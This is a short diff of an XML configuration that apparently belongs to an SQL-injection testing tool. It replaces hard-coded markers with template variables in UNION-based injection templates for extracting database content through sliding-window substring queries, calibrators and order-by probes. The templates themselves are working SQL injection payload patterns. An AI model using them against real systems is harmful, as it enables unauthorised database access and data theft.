@@ -91,18 +91,18 @@ from (
     <strategy>
         <configuration>
             <slidingWindow>
-select 'SQLi'
+select '${LEAD}'
     %2bsubstring(r,${INDEX},65536)
 from(${INJECTION})x
             </slidingWindow>
             <limit> having count(*) between ${LIMIT} and ${LIMIT}</limit>
             <failsafe>select convert(varchar,(1337${INDICE}7330%2b1))r</failsafe>
-            <calibrator>replicate('%23',1024)</calibrator>
+            <calibrator>replicate('${CALIBRATOR_SQL}',1024)</calibrator>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${STARS} from(${INDICES_STARS})b</indices>
-            <capacity>(select'SQLi${INDICE}'%2b${CALIBRATOR}%2b'iLQS')</capacity>
+            <indices> union select ${RESULT_RANGE} from(${INDICE_UNIQUE})b</indices>
+            <capacity>(select'${LEAD}${INDICE}'%2b${CALIBRATOR})</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
